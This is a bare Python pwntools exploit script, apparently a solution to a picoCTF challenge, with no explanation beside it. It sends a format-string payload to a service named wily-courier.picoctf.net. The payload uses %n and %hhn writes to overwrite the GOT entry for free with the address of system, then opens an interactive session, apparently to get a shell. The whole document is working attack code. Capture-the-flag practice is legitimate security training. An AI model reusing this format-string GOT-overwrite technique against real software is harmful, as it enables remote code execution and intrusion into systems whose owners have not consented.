#!/usr/bin/env python3
from pwn import *

PORT =  50000
HOST = "wily-courier.picoctf.net"
exe = context.binary = ELF('./vuln', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b*buy_stonks+224
            c
            set follow-fork-mode parent
            ''')

def conn():
    if len(sys.argv) > 1 and sys.argv[1] == 'r':
        return remote(HOST, PORT)
    else:
        return exe.process()

p = conn()
p.sendlineafter("\n", str(1))
system_plt = 0x4006f0 & 0xff
free_got = 0x602018

# GDB()
pl = f"%c%c%c%c%c%c%c%c%c%c%{free_got-10}c%n".encode()
pl += f"%{system_plt + 0xe8}c%20$hhn".encode()
pl += f"%{16803955-6300144}c%18$n".encode()

p.sendlineafter("\n", pl)


p.interactive()